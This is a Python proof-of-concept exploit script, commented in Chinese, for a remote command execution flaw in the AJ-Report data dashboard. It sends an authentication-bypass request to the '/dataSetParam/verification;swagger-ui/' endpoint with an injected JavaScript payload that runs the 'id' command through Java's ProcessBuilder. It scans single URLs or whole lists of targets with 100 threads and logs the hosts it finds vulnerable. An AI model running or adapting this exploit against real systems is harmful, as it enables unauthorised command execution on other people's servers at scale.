import requests,argparse,sys
from multiprocessing.dummy import Pool

def poc(target):
    target = target.strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    payload="/dataSetParam/verification;swagger-ui/"
    headers={
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
        'Content-Type': 'application/json;charset=UTF-8',
        'Connection': 'close'
    }
    data = {
        "ParamName": "",
        "paramDesc": "",
        "paramType": "",
        "sampleItem": "1",
        "mandatory": True,
        "requiredFlag": 1,
        "validationRules": """function verification(data){a = new java.lang.ProcessBuilder("id").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"""
    }
    re1 = requests.get(url=target,headers=headers,timeout=5)
    try:
        if re1.status_code ==200:
            re2 = requests.post(url=target+payload,headers=headers,json=data,timeout=5)
            if "gid" in re2.text and 'uid' in re2.text:
                print( f"{target}有rce漏洞")
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write('AJ命令执行'+target+'\n')
            else:
                print( f"{target}没有rce漏洞")
        else:
            print( f"{target}访问异常")
    except Exception as e:
        print(e)


def main():
    
    parse = argparse.ArgumentParser(description="AJ-Report开源数据大屏存在远程命令执行漏洞")

    parse.add_argument('-u','--url',type=str,dest='url',help='输入url测试')
    parse.add_argument('-file','--file',type=str,dest='file',help='输入url文件测试')

    args =parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.closer()
        mp.join()
    else:
        print(f"Python {sys.argv[0]} ")
            
    
if __name__=='__main__':
    main()